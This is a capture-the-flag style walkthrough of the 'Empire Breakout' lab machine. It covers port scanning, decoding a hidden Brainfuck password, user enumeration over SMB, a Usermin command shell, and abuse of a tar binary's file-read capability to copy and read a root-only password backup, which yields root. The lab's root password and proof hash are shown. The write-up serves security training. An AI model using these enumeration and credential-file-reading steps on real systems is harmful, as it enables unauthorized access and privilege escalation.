---
layout: post
title: Empire Breakout walkthrough
subtitle: Explanation
categories: Hacking
tags: [pg, hacking]
---
### Empire-Breakout

### Difficulty - Easy

Start first with a port scan
```
PORT      STATE SERVICE     REASON  VERSION
80/tcp    open  http        syn-ack Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
139/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
20000/tcp open  http        syn-ack MiniServ 1.830 (Webmin httpd)
|_http-server-header: MiniServ/1.830
|_http-title: 200 &mdash; Document follows
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 599F1D15E0C8BCAE078BE87529916D7A

Host script results:
|_clock-skew: 0s
| smb2-time: 
|   date: 2023-01-25T14:53:04
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 36348/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 60233/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44332/udp): CLEAN (Timeout)
|   Check 4 (port 45931/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```
We see there are 2 webservers and an smb server running on the machine.

Let's take a look at port 80.
When inspecting the page source, scrolling to the bottom gives us this.

![Screenshot from 2023-01-25 18-02-58](https://user-images.githubusercontent.com/66115581/214630672-e7364c74-ec30-47f0-9292-627d907586eb.png)

You can decode that using this URL https://www.dcode.fr/brainfuck-language.

![Screenshot from 2023-01-25 18-05-10](https://user-images.githubusercontent.com/66115581/214631215-a97d10a6-35a9-4fb9-b160-ad042baefb1e.png)

The output is at the top left, .2uqPEfj3D<P'a-3
Save that for future reference.

Now let's inspect port 20000
It's running Usermin interface. Nice!!! Remembering the ouput from the cipher we decoded, we can use that as a password but all we need is a username.
We need to run enum4linux on the server.
```
=================( Users on 192.168.153.238 via RID cycling (RIDS: 500-550,1000-1050) )=================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-1683874020-4104641535-3793993001 and logon username '', password ''

S-1-5-21-1683874020-4104641535-3793993001-501 BREAKOUT\nobody (Local User)
S-1-5-21-1683874020-4104641535-3793993001-513 BREAKOUT\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\cyber (Local User)

 ==============================( Getting printer info for 192.168.153.238 )==============================

No printers returned.


enum4linux complete on Wed Jan 25 17:23:12 2023
```
Notice the user found at the bottom, 'cyber', and now we can try to login with that user.
Viola!!! We are in.

![Screenshot from 2023-01-25 18-19-15](https://user-images.githubusercontent.com/66115581/214634992-a76ebfd4-17bc-45a0-bad7-38c6a3300435.png)

Switching to the Usermin tab, navigate to the login in the sidebar and click on command shell. Boom you can execute any commands you wish. you can use this URL
to generate reverse shell commands https://www.revshells.com/.

In your shell you can read the local.txt file.
Next, I ran linpeas.sh on the machine and found this

```
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	000001ffffffffff
CapAmb:	0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	000001ffffffffff
CapAmb:	0000000000000000

Files with capabilities (limited to 50):
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

The tar binary has been assigned capabilities to read any file. We can use it to read some advantageous files for us. 
Looking at the /var/backups directory we see this.
```
cyber@breakout:~$ cd /var/backups
cd /var/backups
cyber@breakout:/var/backups$ ls -la
ls -la
total 484
drwxr-xr-x  2 root root   4096 Dec  8 06:25 .
drwxr-xr-x 14 root root   4096 Oct 19  2021 ..
-rw-r--r--  1 root root  40960 Dec  8 06:25 alternatives.tar.0
-rw-r--r--  1 root root  12674 Nov 17 03:45 apt.extended_states.0
-rw-r--r--  1 root root   1467 Oct 19  2021 apt.extended_states.1.gz
-rw-r--r--  1 root root      0 Dec  8 06:25 dpkg.arch.0
-rw-r--r--  1 root root    186 Oct 19  2021 dpkg.diversions.0
-rw-r--r--  1 root root    135 Oct 19  2021 dpkg.statoverride.0
-rw-r--r--  1 root root 413488 Oct 19  2021 dpkg.status.0
-rw-------  1 root root     17 Oct 20  2021 .old_pass.bak
cyber@breakout:/var/backups$ 
```
One file stands out there, '.old_pass.bak'. 
In the home directory, run this command to compress the file.
```
cyber@breakout:~$ ./tar -cf pass.tar /var/backups/.old_pass.bak
./tar -cf pass.tar /var/backups/.old_pass.bak
./tar: Removing leading `/' from member names
```
Then run this
```
yber@breakout:~$ tar -xf pass.tar
tar -xf pass.tar
cyber@breakout:~$ ls -la
ls -la
total 1344
drwxr-xr-x  9 cyber cyber   4096 Jan 25 13:11 .
drwxr-xr-x  3 root  root    4096 Oct 19  2021 ..
-rw-------  1 cyber cyber      0 Oct 20  2021 .bash_history
-rw-r--r--  1 cyber cyber    220 Oct 19  2021 .bash_logout
-rw-r--r--  1 cyber cyber   3526 Oct 19  2021 .bashrc
drwxr-xr-x  2 cyber cyber   4096 Oct 19  2021 .filemin
drwx------  3 cyber cyber   4096 Jan 25 12:50 .gnupg
-rwxr-xr-x  1 cyber cyber 776785 Jun 30  2022 linpeas.sh
drwxr-xr-x  3 cyber cyber   4096 Oct 19  2021 .local
-rw-r--r--  1 root  root      33 Jan 25 12:17 local.txt
-rw-r--r--  1 cyber cyber  10240 Jan 25 13:10 pass.tar
-rw-r--r--  1 cyber cyber    807 Oct 19  2021 .profile
drwx------  2 cyber cyber   4096 Oct 19  2021 .spamassassin
-rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar
drwxr-xr-x  2 cyber cyber   4096 Oct 20  2021 .tmp
drwx------ 16 cyber cyber   4096 Oct 19  2021 .usermin
drwxr-xr-x  3 cyber cyber   4096 Jan 25 13:11 var
```
Navigate to the var directory, and read the .old_pass.bak to get the root password.
```
cyber@breakout:~$ cd var/backups
cd var/backups
cyber@breakout:~/var/backups$ cat .old_pass.bak
cat .old_pass.bak
Ts&4&YurgtRX(=~h
cyber@breakout:~/var/backups$ su root
su root
Password: Ts&4&YurgtRX(=~h

root@breakout:/home/cyber/var/backups# cd /root
cd /root
root@breakout:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@breakout:~# whoami
whoami
root
root@breakout:~# cat proof.txt
cat proof.txt
9df7e481a46456f6558e0745ab19323f
root@breakout:~
```
And boom we're root.
